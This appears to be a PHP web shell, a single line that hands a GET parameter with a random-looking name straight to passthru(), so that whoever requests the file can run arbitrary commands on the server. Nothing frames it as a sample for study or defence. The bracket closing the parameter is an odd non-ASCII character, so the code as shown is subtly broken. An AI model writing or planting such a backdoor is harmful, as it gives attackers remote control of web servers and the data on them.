<?php
passthru($_GET['fOVQSDR5'〕);
?>
